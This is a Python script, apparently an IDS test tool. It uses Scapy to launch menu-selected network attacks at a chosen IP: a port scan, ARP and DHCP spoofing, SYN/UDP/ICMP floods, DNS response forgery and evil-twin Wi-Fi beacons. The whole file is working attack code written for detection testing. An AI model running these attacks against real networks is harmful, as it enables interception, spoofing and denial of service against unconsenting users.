"""
Interactive Attack Simulator for IDS Testing
-------------------------------------------
Choose target IP once, then select which attack to launch.
Uses Scapy to generate the test traffic.

Some attacks are easier to observe in monitor mode than others:
- ARP spoof / DHCP spoof / Evil Twin: best tested at L2 or monitor mode.
- Port scan / SYN / UDP / ICMP / DNS poison: best tested when the sniffer can see
  the victim traffic clearly (same host, mirrored port, open lab, or decrypted lab wifi).
"""

from scapy.all import (
    ARP,
    BOOTP,
    DHCP,
    DNS,
    DNSQR,
    DNSRR,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11ProbeResp,
    Ether,
    ICMP,
    IP,
    LLC,
    RadioTap,
    RandMAC,
    RandShort,
    SNAP,
    TCP,
    UDP,
    send,
    sendp,
)
import sys
import time


def clear_screen():
    print("\033c", end="")


def get_target_ip() -> str:
    while True:
        ip = input("\nEnter target IP address (e.g. 192.168.1.100): ").strip()
        if ip.count(".") == 3 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split(".")):
            return ip
        print("Invalid IP address. Try again.")


def wait_key():
    input("\nPress Enter to continue...")


def port_scan(target: str):
    print(f"\n[ PORT SCAN ] → {target}")
    ports = list(range(1, 180))
    src_port = RandShort()
    for i, port in enumerate(ports, 1):
        pkt = IP(dst=target) / TCP(sport=src_port, dport=port, flags="S")
        send(pkt, verbose=0)
        if i % 30 == 0:
            print(f"  Sent {i}/{len(ports)} SYN packets...")
            time.sleep(0.08)


def arp_spoof(target: str):
    print(f"\n[ ARP SPOOF ] → {target}")
    fake_macs = [
        "00:11:22:33:44:55",
        "aa:bb:cc:dd:ee:ff",
        "11:22:33:44:55:66",
        "99:88:77:66:55:44",
        "fe:dc:ba:98:76:54",
    ]
    gateway_ip = input("  Enter gateway/router IP (or press Enter to use 192.168.1.1): ").strip() or "192.168.1.1"
    for i, mac in enumerate(fake_macs, 1):
        arp = ARP(op=2, pdst=target, psrc=gateway_ip, hwsrc=mac)
        send(arp, verbose=0)
        print(f"  Sent ARP reply {i}/{len(fake_macs)} (MAC = {mac})")
        time.sleep(1.1)


def syn_flood(target: str):
    print(f"\n[ SYN FLOOD ] → {target}")
    for i in range(1, 351):
        pkt = IP(dst=target) / TCP(sport=RandShort(), dport=80, flags="S")
        send(pkt, verbose=0)
        if i % 80 == 0:
            print(f"  Sent {i} SYN packets...")
            time.sleep(0.04)


def udp_flood(target: str):
    print(f"\n[ UDP FLOOD ] → {target}")
    for i in range(1, 601):
        pkt = IP(dst=target) / UDP(sport=RandShort(), dport=12345) / (b"X" * 120)
        send(pkt, verbose=0)
        if i % 150 == 0:
            print(f"  Sent {i} UDP packets...")
            time.sleep(0.03)


def icmp_flood(target: str):
    print(f"\n[ ICMP FLOOD ] → {target}")
    for i in range(1, 601):
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=0)
        if i % 150 == 0:
            print(f"  Sent {i} ICMP packets...")
            time.sleep(0.03)


def dns_poison(target: str):
    print(f"\n[ DNS POISON ] → {target}")
    domain = "example.com"
    fake_ips = ["10.13.37.101", "172.16.99.42", "192.168.55.123", "1.3.3.7"]
    for ip in fake_ips:
        pkt = IP(dst=target) / UDP(sport=5353, dport=53) / DNS(qr=1, aa=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, rdata=ip))
        send(pkt, verbose=0)
        print(f"  Sent fake answer: {domain} → {ip}")
        time.sleep(1.0)


def dhcp_spoof(_target: str = ""):
    print("\n[ DHCP SPOOF ]")
    fake_servers = ["192.168.55.10", "10.0.0.88", "172.16.1.200"]
    iface = input("  Network interface (e.g. eth0, en0, wlan0mon): ").strip() or "eth0"
    for server in fake_servers:
        pkt = (
            Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=2, yiaddr="192.168.55.77", chaddr=bytes.fromhex(str(RandMAC()).replace(':', ''))[:6]) /
            DHCP(options=[("message-type", "offer"), ("server_id", server), "end"])
        )
        sendp(pkt, iface=iface, verbose=0)
        print(f"  Sent DHCP Offer from server {server}")
        time.sleep(1.5)


def evil_twin(_target: str = ""):
    print("\n[ EVIL TWIN ]")
    iface = input("  Monitor-mode interface (e.g. wlan0mon): ").strip() or "wlan0mon"
    ssid = input("  SSID to spoof (default: TestWiFi): ").strip() or "TestWiFi"
    legit_bssid = input("  Legit/first BSSID (default: 02:11:22:33:44:55): ").strip() or "02:11:22:33:44:55"
    rogue_bssid = input("  Rogue/new BSSID (default: 66:77:88:99:aa:bb): ").strip() or "66:77:88:99:aa:bb"

    frames = [
        RadioTap(dBm_AntSignal=-62) /
        Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=legit_bssid, addr3=legit_bssid) /
        Dot11Beacon(cap="ESS+privacy") /
        Dot11Elt(ID="SSID", info=ssid.encode()) /
        Dot11Elt(ID="DSset", info=bytes([1])),
        RadioTap(dBm_AntSignal=-28) /
        Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=rogue_bssid, addr3=rogue_bssid) /
        Dot11Beacon(cap="ESS+privacy") /
        Dot11Elt(ID="SSID", info=ssid.encode()) /
        Dot11Elt(ID="DSset", info=bytes([11])),
    ]

    for i in range(6):
        sendp(frames, iface=iface, verbose=0)
        print(f"  Broadcast pair {i + 1}/6 for SSID '{ssid}'")
        time.sleep(1.0)


def show_menu() -> int:
    print("\n" + "=" * 50)
    print("  IDS Attack Simulator – Choose attack to test")
    print("=" * 50)
    print("  1) Port Scan")
    print("  2) ARP Spoof")
    print("  3) SYN Flood")
    print("  4) UDP Flood")
    print("  5) ICMP Flood")
    print("  6) DNS Poisoning")
    print("  7) DHCP Spoof")
    print("  8) Evil Twin")
    print("  0) Exit")
    print("-" * 50)
    while True:
        try:
            choice = int(input("Select attack (0-8): "))
            if 0 <= choice <= 8:
                return choice
            print("Please enter number 0–8.")
        except ValueError:
            print("Please enter a number.")


ATTACKS = {
    1: ("Port Scan", port_scan),
    2: ("ARP Spoof", arp_spoof),
    3: ("SYN Flood", syn_flood),
    4: ("UDP Flood", udp_flood),
    5: ("ICMP Flood", icmp_flood),
    6: ("DNS Poisoning", dns_poison),
    7: ("DHCP Spoof", dhcp_spoof),
    8: ("Evil Twin", evil_twin),
}


def main():
    if len(sys.argv) > 1 and sys.argv[1] in ("--help", "-h"):
        print(__doc__)
        return

    print("IDS Attack Simulator\n====================\n")
    target = get_target_ip()

    while True:
        clear_screen()
        print(f"\nCurrent target: {target}\n")
        choice = show_menu()
        if choice == 0:
            print("\nExiting...")
            break
        attack_name, attack_func = ATTACKS[choice]
        print(f"\n{'=' * 20} {attack_name} {'=' * 20}\n")
        try:
            attack_func(target)
        except KeyboardInterrupt:
            print("\nInterrupted by user.")
        except Exception as e:
            print(f"\nError during attack: {e}")
        wait_key()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExited by user.")
